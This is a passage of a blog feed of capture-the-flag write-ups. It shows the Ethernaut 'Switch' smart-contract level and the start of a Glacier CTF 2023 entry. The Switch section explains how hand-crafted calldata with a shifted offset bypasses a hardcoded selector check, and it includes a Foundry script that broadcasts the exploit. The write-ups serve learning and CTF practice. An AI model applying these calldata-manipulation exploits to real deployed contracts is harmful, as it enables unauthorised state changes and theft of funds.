&lt;&#x2F;span&gt;&lt;span&gt;        gate&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;enter&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;GatekeeperThreeSolve.s.sol:GatekeeperThreeSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;29-switch&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#29-switch&quot; aria-label=&quot;Anchor link for: 29-switch&quot;&gt;29 Switch&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Switch.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Switch {
&lt;&#x2F;span&gt;&lt;span&gt;    bool public switchOn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; switch is off
&lt;&#x2F;span&gt;&lt;span&gt;    bytes4 public offSelector &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bytes4&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;keccak256&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;turnSwitchOff()&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;onlyThis&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Only the contract can call this&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;onlyOff&lt;&#x2F;span&gt;&lt;span&gt;() {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; we use a complex data type to put in memory
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;] memory selector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; check that the calldata at position 68 (location of _data)
&lt;&#x2F;span&gt;&lt;span&gt;        assembly {
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calldatacopy&lt;&#x2F;span&gt;&lt;span&gt;(selector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;68&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; grab function selector from calldata
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;            selector[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;offSelector&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Can only call the turnOffSwitch function&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        )&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;flipSwitch&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;bytes memory _data&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOff &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        (bool success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;call&lt;&#x2F;span&gt;&lt;span&gt;(_data)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(success&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;call failed :(&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;turnSwitchOn&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyThis &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        switchOn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;true&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;turnSwitchOff&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyThis &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;        switchOn &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Just have to flip the switch.&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;ul&gt;
&lt;li&gt;Solution&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;Switch contract has three functions &lt;code&gt;turnSwitchOff()&lt;&#x2F;code&gt;, &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; and &lt;code&gt;flipSwitch()&lt;&#x2F;code&gt;. In which we can only able to call flipSwitch function.&lt;&#x2F;li&gt;
&lt;li&gt;By using this flipSwitch only we have to call the &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; function. For this we need to pass the calldata for the function call &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;But If we pass the &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; calldata to the &lt;code&gt;flipSwitch()&lt;&#x2F;code&gt; it will be reverted by &lt;code&gt;onlyOff&lt;&#x2F;code&gt; modifier.&lt;&#x2F;li&gt;
&lt;li&gt;Because, onlyOff is checking that the calldata&#x27;s 68 to 72 bytes should only contain the signature of the &lt;code&gt;turnSwitchOff()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;The vulnerability is present inside the &lt;code&gt;onlyOff()&lt;&#x2F;code&gt; modifier as its function signature check byte position is hardcoded (68,4).&lt;&#x2F;li&gt;
&lt;li&gt;We can modify the calldata in order to bypass the check and as well as call the &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;Lets understand &lt;code&gt;calldata&lt;&#x2F;code&gt; specificly when passing dynamic datatypes as arguments&lt;&#x2F;li&gt;
&lt;li&gt;When we call a function on a contract, the calldata will be sent via the transaction as &lt;code&gt;msg.data&lt;&#x2F;code&gt;, Lets see what this data consists.&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt; calldata with dynamic arguments
&lt;&#x2F;span&gt;&lt;span&gt;   =&amp;gt; &amp;lt;function signature&amp;gt; &amp;lt;offset&amp;gt; &amp;lt;length of data&amp;gt; &amp;lt;data&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt; Each field will be padded to 32 bytes except function signature.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; calldata when we call flipSwitch() with turnSwitchOff() function signature 
&lt;&#x2F;span&gt;&lt;span&gt;      30c13ade  &#x2F;&#x2F; flipSwitch() signature
&lt;&#x2F;span&gt;&lt;span&gt; 00 : 0000000000000000000000000000000000000000000000000000000000000020   ==&amp;gt; offset - the starting position of the actual data 
&lt;&#x2F;span&gt;&lt;span&gt; 20 : 0000000000000000000000000000000000000000000000000000000000000004   ==&amp;gt; length - data length
&lt;&#x2F;span&gt;&lt;span&gt; 40 : 20606e1500000000000000000000000000000000000000000000000000000060   ==&amp;gt; data - data that we passed through argument (turnSwitchOff() signature)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;This call to flipSwitch() is succeeded because the check was passed. The check is that from the 68th byte to 72nd byte will be sliced out and this will be checked with the signature of the &lt;code&gt;turnSwitchOff()&lt;&#x2F;code&gt; function.&lt;&#x2F;li&gt;
&lt;li&gt;Now we somehow should manage to send the &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; signature along with this calldata. And we should make sure that only &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; signature should be passed to the &lt;code&gt;call&lt;&#x2F;code&gt; inside &lt;code&gt;flipSwitch()&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;The data which is used inside the function will be specified by the &lt;code&gt;offset&lt;&#x2F;code&gt;. The function will make use of the actual data that is pointed by the offset.&lt;&#x2F;li&gt;
&lt;li&gt;As the &lt;code&gt;onlyOff&lt;&#x2F;code&gt; modifier uses the hardcoded check, we can modify the calldata to be able to insert the &lt;code&gt;turnSwitchOff()&lt;&#x2F;code&gt; function signature at the 68th bytes and append the &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; signature.&lt;&#x2F;li&gt;
&lt;li&gt;Now we have to change the offset of the calldata in such a way that it points to the &lt;code&gt;turnSwitchOn()&lt;&#x2F;code&gt; signature.&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;calldata to bypass onlyOff
&lt;&#x2F;span&gt;&lt;span&gt;  =&amp;gt; &amp;lt;flipSwitch Singature&amp;gt; &amp;lt;Offset&amp;gt; &amp;lt;Dummy Data&amp;gt; &amp;lt;turnSwitchOff Signature&amp;gt; &amp;lt;length of data&amp;gt; &amp;lt;turnSwitchOn Signature&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;   30c13ade
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;00 : 00000000000000000000000000000000000000000000000000000000000000[60]  ==&amp;gt; Offset - position of actual data
20 : 0000000000000000000000000000000000000000000000000000000000000000     ==&amp;gt; Dummy data - to move turnSwitchOff data to 68th byte
40 : 20606e1500000000000000000000000000000000000000000000000000000000  ==&amp;gt; Data - turnSwitchOff() selector (By passes onlyOff)
60 : 0000000000000000000000000000000000000000000000000000000000000004  ==&amp;gt; Length - Length of the turnSwitchOff() signature data
80 : 76227e1200000000000000000000000000000000000000000000000000000000  ==&amp;gt; Actual data - turnSwitchOff() signature&lt;&#x2F;p&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;14. Now this calldata will bypasses the check of onlyOff and we modified the offset to point it to the turnSwitchOn() signature.
&lt;&#x2F;span&gt;&lt;span&gt;15. So, now the calldata passed to the `call` inside flipSwitch() will be,
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;76227e1200000000000000000000000000000000000000000000000000000000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre style=&quot;background-color:#fafafa;color:#61676c;&quot;&gt;&lt;code&gt;&lt;span&gt;16. This will call the turnSwitchOn() function in Switch contract. Finally we will be able to solve the challenge.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;`SwitchSolve.s.sol`
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;```javascript
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity ^0.8.0;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;Script.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;forge-std&#x2F;console.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;import &amp;quot;..&#x2F;src&#x2F;Switch.sol&amp;quot;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SwitchSolve is Script {
&lt;&#x2F;span&gt;&lt;span&gt; Switch public sw = Switch(0x8592a0765f942ba46ADf3a0EB1fF57b1d74664F0);
&lt;&#x2F;span&gt;&lt;span&gt; function run() external{
&lt;&#x2F;span&gt;&lt;span&gt;     vm.startBroadcast(vm.envUint(&amp;quot;PRIVATE_KEY&amp;quot;));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     console.log(&amp;quot;Switch  : &amp;quot;, sw.switchOn());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     &#x2F;&#x2F; bytes memory data = abi.encodeWithSignature(&amp;quot;turnSwitchOff()&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;     bytes memory data = abi.encodeWithSignature(&amp;quot;flipSwitch(bytes)&amp;quot;,0x60, 0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000, 0x04, 0x76227e1200000000000000000000000000000000000000000000000000000000);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     console.logBytes(data);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     address(sw).call(data);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     console.log(&amp;quot;Switch  : &amp;quot;, sw.switchOn());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;     vm.stopBroadcast();
&lt;&#x2F;span&gt;&lt;span&gt; }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;SwitchSolve.s.sol:SwitchSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;hr &#x2F;&gt;
&lt;p&gt;That&#x27;s it for the write-up ! To connect with me send a request at &lt;a href=&quot;https:&#x2F;&#x2F;www.twitter.com&#x2F;TheMj0ln1r&quot;&gt;@TheMj0ln1r&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;References&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;x676f64&#x2F;secureum-mind_map&quot; target=_blank &gt;Secureum Bootcamp&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ethereumbook&#x2F;ethereumbook&quot; target=_blank &gt;Mastering Ethereum&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Glacier CTF 2023</title>
        <published>2023-11-27T00:00:00+00:00</published>
        <updated>2023-11-27T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/glacierctf23/"/>
        <id>https://themj0ln1r.github.io/writeups/glacierctf23/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/glacierctf23/">&lt;p&gt;Hey hi, I played &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1992&quot; target=_blank&gt;Glacier CTF 2023&lt;&#x2F;a&gt;. I joined with &lt;a href=&quot;https:&#x2F;&#x2F;ctftime.org&#x2F;team&#x2F;116280&quot; target=_blank&gt;CyberSpace&lt;&#x2F;a&gt; a wonderful team to work with. We got &lt;strong&gt;&lt;code&gt;14th&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt; place in this CTF. I am focused on my fav smart contract challenges and solved ALL of them. Let me share those ATTACK scripts here.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;smart-contracts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#smart-contracts&quot; aria-label=&quot;Anchor link for: smart-contracts&quot;&gt;Smart Contracts&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;glacier23&#x2F;glacierctf23_progress.png&quot; class=&quot;autoimg&quot;&#x2F;&gt;
&lt;p&gt;Clone my solution repository to follow along&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;git&lt;&#x2F;span&gt;&lt;span&gt; clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;GlacierCTF23Solves.git
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h2 id=&quot;glaciercoin-68pts&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#glaciercoin-68pts&quot; aria-label=&quot;Anchor link for: glaciercoin-68pts&quot;&gt;GlacierCoin [68pts]&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Description :
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;You start your journey up the glacier, to get to new heights (maybe even the moon). To get up the first part of the glacie you will need a guide to help you. The cheapest guide that you find charges you 1000 glacier coins, but unfortunately you only have 10. Find a way to pay the guide. To get the ticket, run solve-pow.py&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;author: J4X
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;nc chall.glacierctf.com 13372
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Attached Files : [Challenge.sol, Setup.sol, solve-pow.py]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;Note : solve-pow.py is just a pow script which generates a ticket for solver which used to deploy our challenge instance using &lt;code&gt;nc chall.glacierctf.com 13372&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;code&gt;Setup.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;Challenge.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Setup {
&lt;&#x2F;span&gt;&lt;span&gt;    GlacierCoin public immutable TARGET&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;; &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; Contract the player will hack
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() payable {
